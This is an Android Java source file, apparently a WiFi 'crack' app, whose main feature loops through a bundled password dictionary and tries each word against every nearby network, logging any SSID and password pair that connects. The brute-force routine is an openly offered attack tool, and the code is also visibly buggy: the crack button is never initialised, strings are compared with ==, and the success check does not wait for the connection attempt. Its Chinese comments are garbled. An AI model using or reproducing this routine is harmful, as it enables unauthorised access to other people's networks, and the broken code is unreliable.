package com.jcc.conwifi;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.List;

import android.app.Activity;
import android.app.AlertDialog.Builder;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;


/**
 * @ClassName: WifiActivity
 * @Description: jcc
 * @date 2016��9��23�� 17:00:23
 *
 */
public class WifiActivity extends Activity implements OnClickListener
{

    private Button scan_button;

    private Button crack;

    private TextView wifi_result_textview;

    private TextView crack_result;

    private WifiManager wifiManager;

    private WifiInfo currentWifiInfo;// ��ǰ�����ӵ�wifi

    private List<ScanResult> wifiList;// wifi�б�

    private String[] str;

    private int wifiIndex;

    private ProgressDialog progressDialog;

    private static int crack_flag = 1;

    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.wifi_layout);
        wifiManager = (WifiManager) getSystemService(Context.WIFI_SERVICE);
        setupViews();
        initListener();
    }

    @Override
    protected void onResume()
    {
        openWifi();
        currentWifiInfo = wifiManager.getConnectionInfo();
        wifi_result_textview.setText("��ǰ���磺" + currentWifiInfo.getSSID()
                + " ip:" + WifiUtil.intToIp(currentWifiInfo.getIpAddress()));
        new ScanWifiThread().start();
        super.onResume();
    }


    public void setupViews()
    {
        scan_button = (Button) findViewById(R.id.scan_button);
        wifi_result_textview = (TextView) findViewById(R.id.wifi_result);
        crack_result = (TextView) findViewById(R.id.crack_result);


    }


    public void initListener()
    {
        scan_button.setOnClickListener(this);
        crack.setOnClickListener(this);

    }

    @Override
    public void onClick(View v)
    {
        switch (v.getId())
        {
            case R.id.scan_button:
                lookUpScan();
                break;
            case R.id.crack:
                findpds();
                break;
        }
    }

    /**
     * ��wifi
     */
    public void openWifi()
    {
        if (!wifiManager.isWifiEnabled())
        {
            wifiManager.setWifiEnabled(true);
        }
    }

    /**
     * ɨ��wifi�߳�
     *
     * @author passing
     *
     */
    class ScanWifiThread extends Thread
    {

        @Override
        public void run()
        {
            while (true)
            {
                currentWifiInfo = wifiManager.getConnectionInfo();
                startScan();
                try
                {
                    Thread.sleep(1000);
                }
                catch (InterruptedException e)
                {
                    break;
                }
            }
        }
    }

    /**
     * ɨ��wifi
     */
    public void startScan()
    {
        wifiManager.startScan();
        // ��ȡɨ����
        wifiList = wifiManager.getScanResults();
        str = new String[wifiList.size()];
        String tempStr = null;
        for (int i = 0; i < wifiList.size(); i++)
        {
            tempStr = wifiList.get(i).SSID;
            if (null != currentWifiInfo
                    && tempStr.equals(currentWifiInfo.getSSID()))
            {
                tempStr = tempStr + "(������)";
            }
            str[i] = tempStr;
        }
    }

    /**
     * ������ �鿴ɨ����
     */
    public void lookUpScan()
    {
        Builder builder = new Builder(WifiActivity.this);
        builder.setTitle("wifi");
        builder.setItems(str, new DialogInterface.OnClickListener()
        {

            @Override
            public void onClick(DialogInterface dialog, int which)
            {
                wifiIndex = which;
                //ɨ���wifi
                handler.sendEmptyMessage(3);
            }
        });
        builder.show();
    }

    /**
     * ��ȡ����ip��ַ
     *
     * @author passing
     *
     */
    class RefreshSsidThread extends Thread
    {

        @Override
        public void run()
        {
            boolean flag = true;
            while (flag)
            {
                currentWifiInfo = wifiManager.getConnectionInfo();
                if (null != currentWifiInfo.getSSID()
                        && 0 != currentWifiInfo.getIpAddress())
                {
                    flag = false;
                }
            }
            //���ӳɹ�
            handler.sendEmptyMessage(4);
            super.run();
        }
    }

    /**
     * ��������
     *
     * @param index
     * @param password
     */
    public void connetionConfiguration(int index, String password)
    {
        progressDialog = ProgressDialog.show(WifiActivity.this, "��������...",
                "���Ժ�...");
        new ConnectWifiThread().execute(index + "", password);

    }


    /**
     * ����wifi
     *
     * @author passing
     *
     */
    class ConnectWifiThread extends AsyncTask<String, Integer, String>
    {

        @Override
        protected String doInBackground(String... params)
        {
            int index = Integer.parseInt(params[0]);
            if (index > wifiList.size())
            {
                return null;
            }
            // �������ú�ָ��ID������
            WifiConfiguration config = WifiUtil.createWifiInfo(
                    wifiList.get(index).SSID, params[1], 3, wifiManager);

            int networkId = wifiManager.addNetwork(config);
            if (null != config)
            {
                wifiManager.enableNetwork(networkId, true);
                return wifiList.get(index).SSID;
            }
            return null;
        }

        @Override
        protected void onPostExecute(String result)
        {
            if (null != progressDialog)
            {
                progressDialog.dismiss();
            }
            if (null != result)
            {
                crack_flag = 0;
                //���ӳɹ�
                handler.sendEmptyMessage(0);
            }
            else
            {
                crack_flag = 1;
                //����ʧ��
                handler.sendEmptyMessage(1);
            }
            super.onPostExecute(result);
        }

    }

    Handler handler = new Handler()
    {

        @Override
        public void handleMessage(Message msg)
        {
            switch (msg.what)
            {
                case 0:
                    wifi_result_textview.setText("���ڻ�ȡip��ַ...");
                    new RefreshSsidThread().start();
                    break;
                case 1:
                    Toast.makeText(WifiActivity.this, "����ʧ�ܣ�", Toast.LENGTH_SHORT)
                            .show();
                    break;
                case 3:
                    View layout = LayoutInflater.from(WifiActivity.this).inflate(
                            R.layout.custom_dialog_layout, null);
                    Builder builder = new Builder(WifiActivity.this);
                    builder.setTitle("����������").setView(layout);
                    final EditText passowrdText = (EditText) layout
                            .findViewById(R.id.password_edittext);
                    builder.setPositiveButton("����",
                            new DialogInterface.OnClickListener()
                            {

                                @Override
                                public void onClick(DialogInterface dialog,
                                                    int which)
                                {
                                    connetionConfiguration(wifiIndex, passowrdText
                                            .getText().toString());
                                }
                            }).show();
                    break;
                case 4:
                    Toast.makeText(WifiActivity.this, "���ӳɹ���", Toast.LENGTH_SHORT)
                            .show();
                    wifi_result_textview.setText("��ǰ���磺"
                            + currentWifiInfo.getSSID() + " ip:"
                            + WifiUtil.intToIp(currentWifiInfo.getIpAddress()));
                    break;
            }
            super.handleMessage(msg);
        }

    };
    //��ȡ�ֵ�
    public  void  findpds() {
        try {
            InputStream is = getAssets().open("passwords.txt");
            BufferedReader br = new BufferedReader(new InputStreamReader(is));
            //����һ��BufferedReader������ȡ�ļ�
            String s ;

            String tempStr = null;

            for (int i = 0; i < wifiList.size(); i++)
            {
                tempStr = wifiList.get(i).SSID;
                while((s = br.readLine())!=null){//ʹ��readLine������һ�ζ�һ��
                    System.out.println(s);
                    connetionConfiguration(i, s);
                    if (crack_flag == 0){
                        if(crack_result.getText().toString()=="") {
                            crack_result.setText(tempStr+" "+s);
                        }else {
                            crack_result.setText(crack_result.getText().toString()
                                    +"\n"+tempStr+" "+s);
                        }
                        crack_flag=1;
                        break;
                    }
                }
            }

            br.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

